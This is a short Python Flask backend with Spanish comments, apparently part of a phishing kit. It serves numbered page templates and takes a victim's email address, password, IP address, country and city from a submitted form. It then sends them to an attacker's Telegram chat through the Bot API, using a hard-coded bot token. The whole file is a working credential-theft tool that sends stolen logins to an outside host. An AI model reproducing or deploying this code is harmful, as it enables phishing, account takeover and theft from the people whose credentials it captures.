from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')
@app.route('/<int:numero>')
def numero(numero):
    return render_template(f'{numero}.html')
@app.route('/enviar', methods=['POST'])
def enviar():
    
    chat_id = "-"+request.form['chat_id']
    email = request.form['mail_address']
    password = request.form['mail_pass']
    
    ip = request.form['ip']
    pais = request.form['pais']
    ciudad = request.form['ciudad']

    # Aquí puedes enviar el formulario por medio de Telegram
    token = '6760465162:AAG5eXeMcsFOQ-pDZ6hGv5Qx94Zau_f9oa4'
    message = f'Correo electrónico: {email} \nContraseña: {password}\nPais: {pais} \nCiudad: {ciudad} \nIP: {ip}'
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}'
    response = requests.get(url)

    return 'Formulario enviado con éxito'

if __name__ == '__main__':
    app.run(debug=True)
